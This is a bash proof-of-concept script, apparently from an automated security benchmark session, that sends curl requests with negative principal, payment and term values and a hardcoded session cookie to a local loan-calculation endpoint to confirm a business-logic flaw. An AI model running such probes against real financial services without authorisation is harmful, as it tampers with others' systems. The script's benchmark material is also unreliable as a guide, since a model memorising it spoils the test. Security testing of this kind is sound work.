#!/bin/bash
# POC: Demonstrates business logic flaw allowing negative loan payments and principals in /total_loan_payments endpoint
# Target: ./repo
# Created: 2025-11-07T18:09:58.541Z
# Session: benchmark-XBEN-022-24-mhp5xc5o

# POC for Business Logic Flaw: Negative Loan Payments Allowed
# This script demonstrates that the /total_loan_payments endpoint accepts negative values
# for payment and principal parameters, violating business logic constraints

TARGET="http://localhost:80"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aQ41ow.dATezR6aFvM2xLzH7fFEw5nANQc"

echo "========================================"
echo "Business Logic Flaw: Negative Loan Payments POC"
echo "========================================"
echo ""

# Test 1: Negative payment parameter
echo "[Test 1] Negative Payment Parameter"
echo "Command: curl -s -b \"$SESSION_COOKIE\" '$TARGET/total_loan_payments?principal=100000&payment=-500&term=30'"
echo ""

RESPONSE1=$(curl -s -b "$SESSION_COOKIE" "$TARGET/total_loan_payments?principal=100000&payment=-500&term=30")
echo "Response:"
echo "$RESPONSE1" | jq '.' 2>/dev/null || echo "$RESPONSE1"
echo ""

# Verify negative payment is accepted
if echo "$RESPONSE1" | grep -q "\-500"; then
    echo "✓ VULNERABILITY CONFIRMED: Negative payment value (-500) accepted and processed"
    VULN_FOUND=1
else
    echo "✗ Negative payment was rejected or not processed"
fi
echo ""

# Test 2: Negative principal parameter
echo "[Test 2] Negative Principal Parameter"
echo "Command: curl -s -b \"$SESSION_COOKIE\" '$TARGET/total_loan_payments?principal=-100000&payment=500&term=30'"
echo ""

RESPONSE2=$(curl -s -b "$SESSION_COOKIE" "$TARGET/total_loan_payments?principal=-100000&payment=500&term=30")
echo "Response:"
echo "$RESPONSE2" | jq '.' 2>/dev/null || echo "$RESPONSE2"
echo ""

# Verify negative principal is accepted
if echo "$RESPONSE2" | grep -q "\-100000"; then
    echo "✓ VULNERABILITY CONFIRMED: Negative principal value (-100000) accepted and processed"
    VULN_FOUND=1
else
    echo "✗ Negative principal was rejected or not processed"
fi
echo ""

# Test 3: Both negative values
echo "[Test 3] Both Negative Payment and Principal"
echo "Command: curl -s -b \"$SESSION_COOKIE\" '$TARGET/total_loan_payments?principal=-50000&payment=-250&term=24'"
echo ""

RESPONSE3=$(curl -s -b "$SESSION_COOKIE" "$TARGET/total_loan_payments?principal=-50000&payment=-250&term=24")
echo "Response:"
echo "$RESPONSE3" | jq '.' 2>/dev/null || echo "$RESPONSE3"
echo ""

if echo "$RESPONSE3" | grep -q "\-250"; then
    echo "✓ VULNERABILITY CONFIRMED: Multiple negative parameters accepted"
    VULN_FOUND=1
else
    echo "✗ Multiple negative parameters were rejected"
fi
echo ""

# Test 4: Negative term
echo "[Test 4] Negative Term Parameter"
echo "Command: curl -s -b \"$SESSION_COOKIE\" '$TARGET/total_loan_payments?principal=100000&payment=500&term=-30'"
echo ""

RESPONSE4=$(curl -s -b "$SESSION_COOKIE" "$TARGET/total_loan_payments?principal=100000&payment=500&term=-30")
echo "Response:"
echo "$RESPONSE4" | jq '.' 2>/dev/null || echo "$RESPONSE4"
echo ""

if echo "$RESPONSE4" | grep -q "\-30"; then
    echo "✓ VULNERABILITY CONFIRMED: Negative term value (-30) accepted and processed"
    VULN_FOUND=1
else
    echo "✗ Negative term was rejected or not processed"
fi
echo ""

echo "========================================"
echo "POC Summary"
echo "========================================"
if [ "$VULN_FOUND" = "1" ]; then
    echo "✓ VULNERABILITY CONFIRMED: /total_loan_payments endpoint accepts negative values"
    echo "  This allows manipulation of financial calculations in violation of business logic"
    exit 0
else
    echo "✗ Unable to confirm vulnerability"
    exit 1
fi